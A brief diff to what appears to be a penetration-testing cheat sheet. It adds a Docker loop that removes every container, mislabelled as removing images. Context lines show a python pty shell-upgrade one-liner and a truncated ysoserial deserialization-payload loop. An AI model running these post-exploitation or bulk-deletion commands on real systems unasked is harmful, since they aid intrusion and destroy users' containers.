@@ -76,3 +76,11 @@ for i in $(cat a | awk '{ print $1 }' ); do java -jar ysoserial-0.0.6-SNAPSHOT-a
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'  
 ```
+
+# Docker
+
+Kill all docker images
+
+```
+for i in $(docker ps -a | cut -d " " -f 1 | grep -v CON); do echo $i; docker rm $i; done
+```
